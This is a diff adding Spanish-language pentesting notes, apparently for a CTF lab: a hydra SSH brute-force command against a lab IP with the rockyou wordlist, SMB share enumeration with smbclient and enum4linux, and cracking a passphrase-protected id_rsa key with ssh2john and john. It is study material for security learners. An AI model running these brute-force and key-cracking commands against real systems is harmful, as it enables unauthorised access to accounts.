@@ -363,6 +363,10 @@ hydra -L /opt/SecLists/Usernames/top-usernames-shortlist.txt -P /opt/SecLists/Pa
 
 ```
 
+```
+sudo hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 64 -f  ssh://10.10.25.155
+```
+
 ### SMB enumeration 
 
 Para enumerar los posibles shares que existan en SMB
@@ -383,6 +387,34 @@ Para conectarte a los recursos compartidos que encontraste
 
 ```
 smbclient //10.10.25.155/anonymous
+```
+
+## enum4linux
+
+Enum4linux es una herramienta de enumeración de información de sistemas basados en Samba, que se utiliza para obtener información de servidores y estaciones de trabajo que ejecutan el protocolo SMB (Server Message Block). Enum4linux ayuda a los evaluadores de seguridad y administradores de sistemas a recopilar información útil sobre el entorno de Samba, incluyendo la lista de usuarios y grupos, las políticas de contraseña, la configuración de recursos compartidos, la información del sistema operativo y otra información de red. Esta herramienta puede ser útil para identificar posibles vulnerabilidades y puntos débiles en un entorno de red.
+
+```
+
+enum4linux -e [Target_Machine_IP]
+```
+
+## SSH
+
+Yo no sabia pero aunque tengamos una clave privada en este caso una id_rsa puede estar protegida por 
+
+![image](https://user-images.githubusercontent.com/63270579/231051813-a89060f0-f407-4dcb-a12d-076d119e4bbd.png)
+
+Para eso podemos usar john the ripper
+
+![image](https://user-images.githubusercontent.com/63270579/231052020-51f2353d-371d-4148-8c8a-7f2cf6062726.png)
+
+```
+/usr/share/john/ssh2john.py id_rsa > pass_hash.txt
+```
+Ya despues ese hash que sale jonh lo detecta automatico
+
+```
+john pass_hash.txt /usr/share/wordlists/rockyou.txt 
 ```
 
 
